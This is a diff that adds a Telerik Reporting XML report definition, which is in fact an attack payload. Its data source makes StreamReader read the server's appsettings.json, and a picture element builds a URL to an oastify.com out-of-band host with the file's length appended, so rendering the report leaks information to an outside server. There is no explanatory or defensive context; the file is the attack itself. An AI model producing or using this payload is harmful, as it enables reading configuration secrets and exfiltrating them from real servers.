@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Report xmlns="http://schemas.telerik.com/reporting/2020/1.0" Name="Sub" Width="6in" DataSourceName="ods">
+  <DataSources>
+    <ObjectDataSource Name="ods" DataObject="System.IO.StreamReader, mscorlib" DataMember="ReadToEnd">
+      <Parameters>
+        <ObjectDataSourceParameter Name="path" Type="System.String" Value="C:\home\site\wwwroot\appsettings.json" />
+      </Parameters>
+    </ObjectDataSource>
+  </DataSources>
+  <Items><DetailSection Name="d" Height="0.3in"><Items>
+    <PictureBox Name="p" Value="=&quot;http://slen.zwzd7ne3zdry2y1hmgeobsgzhqnkbyegxkf34.oastify.com/len/&quot; + Fields.Length" SizeF="1in,1in" LocationF="0in,0in" />
+  </Items></DetailSection></Items>
+</Report>
